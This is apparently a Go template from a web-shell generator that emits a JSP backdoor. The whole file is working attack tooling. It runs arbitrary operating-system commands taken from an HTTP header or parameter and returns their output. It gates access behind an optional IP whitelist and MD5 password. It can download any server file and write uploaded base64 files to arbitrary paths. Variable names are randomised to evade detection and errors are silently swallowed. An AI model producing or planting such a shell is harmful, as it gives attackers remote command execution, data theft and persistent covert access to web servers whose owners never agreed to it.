<%@ page import="java.util.*,java.io.*" %>
{{ if ne .Password "" }}
<%@ page import="java.security.*" %>
{{ end }}
{{ if .FileCapabilities }}
{{/* <%@ page import="javax.servlet.http.*" %> */}}
{{/* <%@ page import="org.apache.commons.fileupload.*" %> */}}
{{/* <%@ page import="org.apache.commons.fileupload.disk.*" %> */}}
{{/* <%@ page import="org.apache.commons.fileupload.servlet.*" %> */}}
{{/* <%@ page import="org.apache.commons.codec.binary.*" %> */}}
{{/* <%@ page import="org.apache.commons.io.output.*" %> */}}
<%@ page import="java.nio.file.*" %>
{{ end }}
<%
try {
{{/* Get command from param or header */}}
{{ if ne .CmdHeader "" -}}
  String {{ index .V "cmd" }} = request.getHeader("{{ .CmdHeader }}");
{{ else if ne .Method "" -}}
  String {{ index .V "cmd" }} = request.getParameter("{{ .CmdParam }}");
{{ end }}


{{/* Check if ip is in whitelist */}}
{{ if .Whitelist }}

  String[] {{ index .V "whitelist" }} = { {{ .Whitelist }} };
  if (!Arrays.asList({{ index .V "whitelist" }}).contains(request.getRemoteAddr())) {
    return;
  }

{{ end }}


{{/* Check password */}}
{{ if ne .Password "" }}

  String {{ index .V "hash" }} = "{{ .PasswordHash }}";
{{ if ne .PasswordHeader "" }}
  String {{ index .V "pass" }} = request.getHeader("{{ .PasswordHeader }}");
{{ else if ne .PasswordParam "" }}
  String {{ index .V "pass" }} = request.getParameter("{{ .PasswordParam }}");
{{ end }}

  MessageDigest {{ index .V "alg" }} = MessageDigest.getInstance("MD5");
  {{ index .V "alg" }}.reset();
  {{ index .V "alg" }}.update({{ index .V "pass" }}.getBytes());
  byte[] {{ index .V "digest" }} = {{ index .V "alg" }}.digest();
  StringBuffer {{ index .V "hashFunc" }} = new StringBuffer();

  for (int {{ index .V "i" }} = 0; {{ index .V "i" }} < {{ index .V "digest" }}.length; {{ index .V "i" }}++) {
    {{ index .V "pass" }} = Integer.toHexString(0xFF & {{ index .V "digest" }}[{{ index .V "i" }}]);
    if ({{ index .V "pass" }}.length() < 2) {
      {{ index .V "pass" }} = "0" + {{ index .V "pass" }};
    }
    {{ index .V "hashFunc" }}.append({{ index .V "pass" }});
  }

  if (!{{ index .V "hash" }}.equals({{ index .V "hashFunc" }}.toString())) {
    return;
  }

{{ end }}


{{/* Include file capabilities */}}
{{ if .FileCapabilities }}
{{/* Download file */}}
  if ({{ index .V "cmd" }}.length() >= 4 && {{ index .V "cmd" }}.substring(0, 4).equals("get ")) {
    String[] {{ index .V "cmdArgs" }} = {{ index .V "cmd" }}.split(" ");
    if ({{ index .V "cmdArgs" }}.length >= 2) {
      String {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}[1];
      File {{ index .V "file" }} = new File({{ index .V "filePath" }});
      if (!{{ index .V "file" }}.exists()) {
        response.setStatus(404);
        return;
      }
      FileInputStream {{ index .V "fileStream" }} = new FileInputStream({{ index .V "file" }});
      String {{ index .V "mimeType" }} = getServletContext().getMimeType({{ index .V "filePath" }});
      if ({{ index .V "mimeType" }} == null) {
          {{ index .V "mimeType" }} = "application/octet-stream";
      }
      response.setContentType({{ index .V "mimeType" }});
      response.setContentLength((int) {{ index .V "file" }}.length());
      response.setHeader("Content-Disposition", String.format("attachment; filename=\"%s\"", {{ index .V "file" }}.getName()));

      OutputStream {{ index .V "outStream" }} = response.getOutputStream();
      byte[] {{ index .V "buffer" }} = new byte[4096];
      int {{ index .V "bytesRead" }} = -1;

      while (({{ index .V "bytesRead" }} = {{ index .V "fileStream" }}.read({{ index .V "buffer" }})) != -1) {
        {{ index .V "outStream" }}.write({{ index .V "buffer" }}, 0, {{ index .V "bytesRead" }});
      }

      {{ index .V "fileStream" }}.close();
      {{ index .V "outStream" }}.close();   

      return;
    } else {
      return;
    }
  {{/* Upload file */}}
  } else if ({{ index .V "cmd" }}.length() >= 4 && {{ index .V "cmd" }}.substring(0, 4).equals("put ")) {
    String[] {{ index .V "cmdArgs" }} = {{ index .V "cmd" }}.split(" ");
    String {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}[1];
    if ({{ index .V "cmdArgs" }}.length >= 3) {
      {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}[2];
    } else {
      File f = new File({{ index .V "filePath" }});
      {{ index .V "filePath" }} = f.getName();
    }

    String {{ index .V "fileContents" }} = request.getParameter("f");
    try {
      FileOutputStream {{ index .V "outStream" }} = new FileOutputStream({{ index .V "filePath" }});
      {{ index .V "outStream" }}.write(Base64.getDecoder().decode({{ index .V "fileContents" }}));
    } catch (IllegalArgumentException e) {
      response.setStatus(500);
      out.println("Unable to decode base64.");
    } catch (IOException e) {
      response.setStatus(500);
      out.println("Unable to write file");
    }
    return;
  }

{{ end }}


{{/* Run command */}}
Process {{ index .V "process" }} = Runtime.getRuntime().exec({{ index .V "cmd" }});
DataInputStream ds = new DataInputStream({{ index .V "process" }}.getInputStream());
String {{ index .V "output" }} = ds.readLine();
while ( {{ index .V "output" }} != null ) {
  out.println({{ index .V "output" }}); 
  {{ index .V "output" }} = ds.readLine(); 
}
} catch (Exception e) {}
%>